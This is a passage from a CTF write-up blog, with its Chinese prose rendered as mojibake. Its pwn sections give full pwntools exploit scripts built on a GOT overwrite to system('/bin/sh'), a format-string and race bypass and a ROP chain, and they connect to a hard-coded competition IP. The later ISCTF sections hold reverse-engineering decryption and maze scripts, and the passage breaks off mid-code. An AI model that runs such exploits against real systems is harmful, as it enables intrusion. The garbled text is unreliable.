store"></a>beverage store</h4><blockquote><p>è¿™é¢˜å®¹å™¨æœ‰é—®é¢˜ï¼Œåé¦ˆåä¹Ÿæ²¡ä¿®å¥½ï¼Œåªèƒ½èµ›ååŠ åˆ†â€¦â€¦</p></blockquote><p>ç»å…¸è´Ÿæ•°ç´¢å¼•åˆ©ç”¨ã€‚æ‰“éšæœºæ•°å°±ä¸èµ˜è¿°äº†ï¼Œç›´æ¥è¯´æ”»å‡»æµç¨‹ã€‚é¦–å…ˆç¯¡æ”¹<code>exit</code>çš„gotè¡¨åˆ°<code>buy</code>å‡½æ•°ä¸Šï¼Œè®©ç¨‹åºé™·å…¥å¾ªç¯ï¼›å†æ³„éœ²<code>puts</code>åœ°å€ï¼Œæ‹¿åˆ°libcåŸºåœ°å€ï¼›å†ç¯¡æ”¹<code>printf</code>gotè¡¨åˆ°<code>system</code>å‡½æ•°ä¸Šï¼›æœ€åç¯¡æ”¹<code>exit</code>çš„gotè¡¨åˆ°é‚£ä¸ª<code>printf(&quot;/bin/sh&quot;)</code>çš„å‡½æ•°ä¸Šå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> ctypes<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>librand = ctypes.cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b buy</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span> ,<span class="hljs-number">31819</span>)<br>buy = <span class="hljs-number">0x40133b</span><br>backdoor = <span class="hljs-number">0x401511</span><br>io.sendafter(<span class="hljs-string">b&quot;input yours id\n&quot;</span>, <span class="hljs-string">b&quot;name&quot;</span>)<br>librand.srand(librand.time(<span class="hljs-number">0</span>)) <br>rand_byte = <span class="hljs-built_in">str</span>(librand.rand()).encode()<br>sleep(<span class="hljs-number">1</span>)<br>io.sendline(rand_byte)<br><span class="hljs-built_in">print</span>(libc.sym[<span class="hljs-string">&quot;system&quot;</span>]-libc.sym[<span class="hljs-string">&quot;puts&quot;</span>])<br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-4&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(buy))<br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-8&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, <span class="hljs-string">b&quot;\x50&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;succeed\n&quot;</span>)<br>puts_addr = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = <span class="hljs-number">0x4021c2</span><br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-7&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(system_addr))<br><br>io.sendlineafter(<span class="hljs-string">b&quot;4 wine\n&quot;</span>, <span class="hljs-string">b&quot;-4&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;which one to choose\n&quot;</span>, p64(backdoor))<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="Offensive-Security"><a href="#Offensive-Security" class="headerlink" title="Offensive_Security"></a>Offensive_Security</h4><p>å…ˆæ‰“æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»•è¿‡ç¬¬ä¸€ä¸ªæ£€æŸ¥ã€‚æ¥ä¸‹æ¥æ˜¯ä¸¤ä¸ªçº¿ç¨‹ï¼Œéƒ½æ²¡åŠ é”ï¼Œæ•°æ®å…±äº«ï¼Œå…¶ä¸­<code>guess</code>åŠ è½½å¾—å¿«äº›ï¼Œä¹Ÿå°±ç»™äº†æˆ‘ä»¬ç¯¡æ”¹ç›¸åº”å€¼ã€ç»•è¿‡loginæ£€æŸ¥çš„æœºä¼šã€‚ é¦–å…ˆå¿«é€Ÿç»™guesså‘é€ä¸€ä¸ª1ï¼Œsleepä¹‹åå†ç»™checkerå‘ä¸€ä¸ª1ï¼Œå°±å®ç°äº†ç»•è¿‡ã€‚<br>loginæˆåŠŸåæ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œè€ƒè™‘æ„é€ ROPé“¾ã€‚ä½†é¢˜ç›®æ²¡ç»™libcï¼Œé‚£å°±åªèƒ½è€ƒè™‘åˆ©ç”¨ç°æœ‰å‡½æ•°äº†ã€‚æ³¨æ„åˆ°<code>printer</code>å‡½æ•°æ˜¯è¯»å–æŸä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹è¾“å‡ºï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªéœ€è¦æ§åˆ¶<code>rdi</code>å¯„å­˜å™¨çš„å€¼ä¸º<code>flag</code>å­—ç¬¦ä¸²çš„åœ°å€å³å¯ã€‚è¿™é‡Œå¥—ç”¨<code>fluff</code>é¢˜ç›®çš„æ¿å­æ„é€ ROPé“¾æŠŠflagå†™åˆ°dataæ®µä¸Šï¼Œå†pop rdiå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b login</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                b checker</span><br><span class="hljs-comment">#                b guess</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;125.70.243.22&quot;</span>, <span class="hljs-number">31982</span>)<br>printer = <span class="hljs-number">0x400647</span><br>fmt = <span class="hljs-string">b&quot;%7$lln&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;Username:\n&quot;</span>, fmt)<br>io.sendafter(<span class="hljs-string">b&quot;password: \n&quot;</span>, <span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">8</span>)<br><br>io.send(<span class="hljs-string">b&quot;1\n&quot;</span>)<br>sleep(<span class="hljs-number">3</span>)<br>io.send(<span class="hljs-string">b&quot;1\n&quot;</span>)<br><br>bextr_ret = <span class="hljs-number">0x400650</span><br>xlatb_ret = <span class="hljs-number">0x40064e</span><br>pop_rdi_ret = <span class="hljs-number">0x400661</span><br>stosb_rdi_al_ret = <span class="hljs-number">0x40065f</span><br>buffer = <span class="hljs-number">0x6002c0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_rbx</span>(<span class="hljs-params">b:<span class="hljs-built_in">int</span></span>):<br>    p = <span class="hljs-string">b&quot;&quot;</span><br>    p += p64(bextr_ret)<br>    p += p64(<span class="hljs-number">0x4000</span>)<br>    p += p64(b - <span class="hljs-number">0xD093</span>)<br>    <span class="hljs-keyword">return</span> p<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_al</span>(<span class="hljs-params">a:<span class="hljs-built_in">bytes</span>,offset:<span class="hljs-built_in">int</span></span>):<br>    log.success(<span class="hljs-string">&quot;&lt;&lt;&lt;&quot;</span>)<br>    tmp = <span class="hljs-built_in">next</span>(e.search(a)) - offset<br>    log.success(<span class="hljs-string">f&quot;&gt;&gt;&gt;<span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(tmp)&#125;</span>, a=<span class="hljs-subst">&#123;a&#125;</span>&quot;</span>)<br>    p = p64(xlatb_ret)<br>    <span class="hljs-keyword">return</span> set_rbx(tmp) + p<br> <br>is_first = <span class="hljs-literal">True</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_al</span>(<span class="hljs-params">val:<span class="hljs-built_in">bytes</span>,offset:<span class="hljs-built_in">int</span></span>):<br>    <span class="hljs-keyword">global</span> is_first<br>    p = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">if</span> is_first:<br>        p += p64(pop_rdi_ret)<br>        p += p64(buffer)<br>        is_first = <span class="hljs-literal">False</span><br>    p += p64(stosb_rdi_al_ret)<br>    <span class="hljs-keyword">return</span> set_al(val,offset) + p<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_str</span>(<span class="hljs-params">s:<span class="hljs-built_in">bytes</span></span>):<br>    p=<span class="hljs-string">b&quot;&quot;</span><br>    last_al = <span class="hljs-number">0x0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> s:<br>        p += save_al(p8(i),last_al)<br>        last_al = i<br>    <span class="hljs-keyword">return</span> p<br> <br> <br>payload = write_str(<span class="hljs-string">b&quot;flag&quot;</span>)<br>payload += p64(pop_rdi_ret)<br>payload += p64(buffer)<br>payload += p64(printer)<br><br>io.sendafter(<span class="hljs-string">b&quot;success!\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x20</span>+<span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span>+payload)<br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ISCTFwp</title>
    <link href="/2024/11/16/ISCTFwp/"/>
    <url>/2024/11/16/ISCTFwp/</url>
    
    <content type="html"><![CDATA[<h1 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h1><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="å°è“é²¨çš„ç­¾åˆ°01"><a href="#å°è“é²¨çš„ç­¾åˆ°01" class="headerlink" title="å°è“é²¨çš„ç­¾åˆ°01"></a>å°è“é²¨çš„ç­¾åˆ°01</h4><p>æ‰«ç å³å¾—flag</p><h4 id="å°è“é²¨çš„ç­¾åˆ°02"><a href="#å°è“é²¨çš„ç­¾åˆ°02" class="headerlink" title="å°è“é²¨çš„ç­¾åˆ°02"></a>å°è“é²¨çš„ç­¾åˆ°02</h4><p>stringså‘½ä»¤æŸ¥æ‰¾å³å¾—flag<br><img src="/wpsrc/misc02.png"></p><h4 id="æ¸¸å›­åœ°1"><a href="#æ¸¸å›­åœ°1" class="headerlink" title="æ¸¸å›­åœ°1"></a>æ¸¸å›­åœ°1</h4><blockquote><p>å¼€ç›’é¢˜éƒ½åœ¨æ­¦æ±‰æ±Ÿæ±‰è·¯é™„è¿‘ï¼Œæ­¦å¸¦äººç‹‚å–œ</p></blockquote><p>è°·æ­Œæœå›¾ï¼Œ<a href="">https://news.qq.com/rain/a/20231023A06PFW00</a> å°±æœ‰ä¸ªæå…¶ç›¸ä¼¼çš„åœ°æ–¹ï¼ŒæŸ¥å¾—æ­¤åœ°ä¸ºæ­¦æ±‰ä¸­å±±å…¬å›­ã€‚<br>æ•…flagä¸ºISCTF{æ¹–åŒ—çœ_æ­¦æ±‰å¸‚_æ±Ÿæ±‰åŒº_ä¸­å±±å…¬å›­}</p><h4 id="æ¸¸å›­åœ°2"><a href="#æ¸¸å›­åœ°2" class="headerlink" title="æ¸¸å›­åœ°2"></a>æ¸¸å›­åœ°2</h4><p>ç»§ç»­è°·æ­Œæœå›¾ï¼Œ<a href="">https://www.taptap.cn/moment/592096524821860169</a> æœ‰ä¸ªå‡ ä¹ä¸€æ¨¡ä¸€æ ·çš„å›¾ï¼Œçœ‹è¯„è®ºåŒºçŸ¥é“è¿™ä¸ªæ˜¯ã€å……èƒ½å›½å®‰è·¯ã€‘çš„åŸå‹ã€‚<br>æœå……èƒ½å›½å®‰è·¯ï¼Œ<a href="">https://blog.l3zc.com/2023/08/wuhan-trip/#%E5%85%85%E8%83%BD%E5%9B%BD%E5%AE%89%E8%B7%AF</a> è¿™é‡Œæå‡ºäº†æ¸¸æˆåå’ŒåŸå‹è¡—é“ï¼Œé«˜å¾·ä¸€æœç«Ÿç„¶è¿˜æ˜¯æ­¦æ±‰æ±Ÿæ±‰åŒºçš„åœ°æ–¹(<del>ä½ ä»¬äºŒæ¬¡å…ƒæ˜¯æœ‰å¤šå–œæ¬¢æ±Ÿæ±‰è·¯å•Š</del>)<br>å¾—åˆ°flag:ISCTF{æ¹–åŒ—çœ_æ­¦æ±‰å¸‚_æ±Ÿæ±‰åŒº_é¸£ç¬›1988å•†ä¸šè¡—_æ‹çˆ±ç»®è°­}</p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h4 id="EzRe"><a href="#EzRe" class="headerlink" title="EzRe"></a>EzRe</h4><p>åŠ¨è°ƒå‘ç°æ ¸å¿ƒåŠ å¯†é€»è¾‘åœ¨è¿™é‡Œï¼š<br><img src="/wpsrc/re1.png" alt="alt text"><br>åˆçŸ¥é“åŠ å¯†åçš„å­—ç¬¦ä¸²<code>QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;</code>ï¼Œç›´æ¥è§£å¯†å³å¯:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs Python">key = <span class="hljs-string">&quot;ISCTF&quot;</span><br>sercet = <span class="hljs-string">&quot;QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;&quot;</span><br>flag = []<br>j = <span class="hljs-number">0</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">(flag + key)%26 + &quot;A&quot; = QKEMK&#123;7JB5_i5_W3SllD_3z_W3&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> sercet:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">ord</span>(i) &lt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">ord</span>(i) &gt; <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;Z&quot;</span>):<br>        flag.append(i)<br>        j+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    o = <span class="hljs-built_in">ord</span>(i)-<span class="hljs-built_in">ord</span>(key[j%<span class="hljs-number">5</span>])<br>    <br>    o = o%<span class="hljs-number">26</span> + <span class="hljs-built_in">ord</span>(<span class="hljs-string">&quot;A&quot;</span>)<br>    <span class="hljs-built_in">print</span>(o)<br>    flag.append(<span class="hljs-built_in">chr</span>(o))<br>    j+=<span class="hljs-number">1</span><br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&quot;</span>.join(flag))<br></code></pre></td></tr></table></figure><h4 id="ä½ çŸ¥é“-elfæ–‡ä»¶å˜›"><a href="#ä½ çŸ¥é“-elfæ–‡ä»¶å˜›" class="headerlink" title="ä½ çŸ¥é“.elfæ–‡ä»¶å˜›"></a>ä½ çŸ¥é“.elfæ–‡ä»¶å˜›</h4><p>æ‹–è¿›IDAå‘ç°ç«Ÿç„¶å…¨æ˜¯LOADæ®µï¼Œæ— ä»ä¸‹æ‰‹ï¼Œå¹²è„†å…ˆéšä¾¿æ‰§è¡Œä¸€ä¸‹ç®—äº†â€¦â€¦æ‰§è¡Œåå‘ç°åªè¦æŒ‰è¦æ±‚è¾“å…¥base64ç è¡¨å³å¯get flagã€‚<br><img src="/wpsrc/re02.png" alt="alt text"></p><h4 id="ã€Šå›å¿†å®‰é­‚æ›²ã€‹â€“ç¬¬äºŒç« ï¼šå½“è®°å¿†è¢«å‰²è£‚"><a href="#ã€Šå›å¿†å®‰é­‚æ›²ã€‹â€“ç¬¬äºŒç« ï¼šå½“è®°å¿†è¢«å‰²è£‚" class="headerlink" title="ã€Šå›å¿†å®‰é­‚æ›²ã€‹â€“ç¬¬äºŒç« ï¼šå½“è®°å¿†è¢«å‰²è£‚"></a>ã€Šå›å¿†å®‰é­‚æ›²ã€‹â€“ç¬¬äºŒç« ï¼šå½“è®°å¿†è¢«å‰²è£‚</h4><p>æ‹–è¿›IDAå°è¯•F5åç¼–è¯‘ï¼Œå‡ ä¹æ‰€æœ‰å‡½æ•°éƒ½é£˜çº¢å†’å‡ºJUMPOUTï¼Œæ˜¾ç„¶æ˜¯èŠ±æŒ‡ä»¤ã€‚è§‚å¯Ÿå‘ç°ç¨‹åºå®é™…ä¸Šæ˜¯<strong>æŠŠåœ°å€åŠ è½½åˆ°æ ˆä¸Š</strong>ï¼Œå†åˆ©ç”¨å¤æ‚çš„æŒ‡ä»¤è¿›è¡Œ<code>jmp rax</code>è·³è½¬ã€‚å°è¯•nop+patchæ¢å¤ä¼¼ä¹æ²¡ä»€ä¹ˆåµç”¨ï¼Œæ¯•ç«Ÿæ ˆå¸§è°ƒç”¨åŠå…¶è´¹è§£ï¼Œéš¾ä»¥æ¢å¤æ­£å¸¸ã€‚<br>åšè¿™é¢˜çš„æ˜¯pwnæ‰‹ï¼Œäºæ˜¯åœ¨IDAè°ƒè¯•æ²¡å‡ºä»€ä¹ˆæˆæœçš„æƒ…å†µä¸‹æœæ–­é‡‡ç”¨pwndbgè°ƒè¯•ï¼Œç»ˆäºç¼•æ¸…äº†ç¨‹åºé€»è¾‘ï¼š<br><img src="/wpsrc/re3.png"><br>å‘ç°æ•°æ®æ®µä¸Šæœ‰anså’Œkeyï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯<code>answer</code>å’Œ<code>key</code>äº†ã€‚åˆ©ç”¨pwndbgé€æ­¥å®¡è®¡æ±‡ç¼–ä»£ç ï¼Œå‘ç°ç¨‹åºçš„åŠ å¯†å‡½æ•°encé€»è¾‘å¦‚ä¸‹ï¼š</p><ol><li>è®¾å½“å‰å­—ç¬¦ä¸º<code>now</code>,ç´¢å¼•ä¸º<code>i</code></li><li>now ^&#x3D; (0x66+i)</li><li>now ^&#x3D; 0x52</li><li>now +&#x3D; 6</li><li>now ^&#x3D; (key[i]+i)</li></ol><p>ç¼•æ¸…äº†åŠ å¯†é€»è¾‘ã€æ‰¾åˆ°äº†å¯†æ–‡å’Œå¯†é’¥ä¹‹åï¼Œè§£å¯†å°±ä¸éš¾äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python">ans = <span class="hljs-string">b&quot;\xea\x0c\x1a\x11\xf6\x2c\x1d\x3e\x17\x35&quot;</span> \<br>      <span class="hljs-string">b&quot;\x29\xf4\x39\x39\xd3&quot;</span> \<br>      <span class="hljs-string">b&quot;\xc3\x2d\x00\x10\x30\x3d\xcc\x00\xd3\xc0&quot;</span> \<br>      <span class="hljs-string">b&quot;\x4b\xc6\x11\xc7\x29\x3e&quot;</span> \<br>      <span class="hljs-string">b&quot;\xba\x60\x90\x34&quot;</span><br>      <br>key = <span class="hljs-string">b&quot;i_can_reverse_but_i_can_not_have_you&quot;</span><br>l = []<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key)):<br>    now = ans[i]^(key[i]+i)<br>    now -= <span class="hljs-number">6</span><br>    now ^=<span class="hljs-number">0x52</span><br>    now ^= (<span class="hljs-number">0x66</span>+i)<br>    now %=<span class="hljs-number">128</span><br>    l.append(<span class="hljs-built_in">chr</span>(now))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join(l))<br></code></pre></td></tr></table></figure><h4 id="ã€Šå›å¿†å®‰é­‚æ›²ã€‹â€“ç¬¬ä¸‰ç« ï¼šé€ƒä¸å‡ºçš„é»‘å¢™"><a href="#ã€Šå›å¿†å®‰é­‚æ›²ã€‹â€“ç¬¬ä¸‰ç« ï¼šé€ƒä¸å‡ºçš„é»‘å¢™" class="headerlink" title="ã€Šå›å¿†å®‰é­‚æ›²ã€‹â€“ç¬¬ä¸‰ç« ï¼šé€ƒä¸å‡ºçš„é»‘å¢™"></a>ã€Šå›å¿†å®‰é­‚æ›²ã€‹â€“ç¬¬ä¸‰ç« ï¼šé€ƒä¸å‡ºçš„é»‘å¢™</h4><p>è¿·å®«<del>é¥­</del>é¢˜ï¼Œå…ˆä»IDAä¸­æŠŠè¿·å®«æå‡ºæ¥ï¼Œå†è®©AIå†™ä¸ªBFSè„šæœ¬æŸ¥è·¯å¾„å°±è¡Œäº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs Python">puzzle = [<br>    <span class="hljs-string">&quot;###############################P#...............#...#.......#.###&quot;</span>,<br>    <span class="hljs-string">&quot;##.###.#####.#.###.#####.#.....#...#.#.....#...#.#...#.#####.#.##&quot;</span>,<br>    <span class="hljs-string">&quot;#.#.#######.#.#.###.#C..#.#.#...#.#...#...#.#.#...#.#.#.#.#.###.#&quot;</span>,<br>    <span class="hljs-string">&quot;.#.#.###.#.#.#.#.#.#.#.#...#...#.#.......#.#.#.###.#.###.#####.##&quot;</span>,<br>    <span class="hljs-string">&quot;#######.###.#...#...#.....#.#.......#...#.#.#####.#####.#.#.#####&quot;</span>,<br>    <span class="hljs-string">&quot;.###.#...#...#...#...#...#...#.#...#.###.#.###.#.#######.#.#.#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;#...#.#.#...#.#...#...#...#.#.###.#.#.#####.#.#.#.#######.###.#..&quot;</span>,<br>    <span class="hljs-string">&quot;.#.....#...#.#.#...#.....#.#########.#####.#.###.#.###.#.#.....#.&quot;</span>,<br>    <span class="hljs-string">&quot;#...#...#...#...#.#.#.#.#.#.#.###.#.#####.###.#.#.#...#.#...#.#..&quot;</span>,<br>    <span class="hljs-string">&quot;.#...#...#...#.#.###.###.#.#####.#.###.###.#.#...#.#.#.......#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;..#.#...#.#####.#.#######.#.#####.#.###.#...#.#.......#.#...#...#&quot;</span>,<br>    <span class="hljs-string">&quot;.#..E#.#.#.#.#######.###.#.#####.#.#.#...#.............#.....#.#.&quot;</span>,<br>    <span class="hljs-string">&quot;#.###############.#######.#.#.#.........#...#...#.....#...#.#.###&quot;</span>,<br>    <span class="hljs-string">&quot;####.#.#.#####.#.#######.#.......#...#.......#.........&quot;</span><br>]<br>puzzle = <span class="hljs-string">&quot;&quot;</span>.join(puzzle)<br>p = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(puzzle), <span class="hljs-number">30</span>):<br>    p.append(<span class="hljs-built_in">list</span>(puzzle[i:i+<span class="hljs-number">30</span>]))<br>    <br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> p:<br>    <span class="hljs-built_in">print</span>(j)<br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">##############################</span><br><span class="hljs-string">#P#...............#...#.......</span><br><span class="hljs-string">#.#####.###.#####.#.###.#####.</span><br><span class="hljs-string">#.....#...#.#.....#...#.#...#.</span><br><span class="hljs-string">#####.#.###.#.#######.#.#.###.</span><br><span class="hljs-string">#...#.#.#...#.#...#...#.#.#...</span><br><span class="hljs-string">#.#.#.#.#.###.#.#.#.###.#.#.#.</span><br><span class="hljs-string">#.#.#.#.#...#...#.#.......#.#.</span><br><span 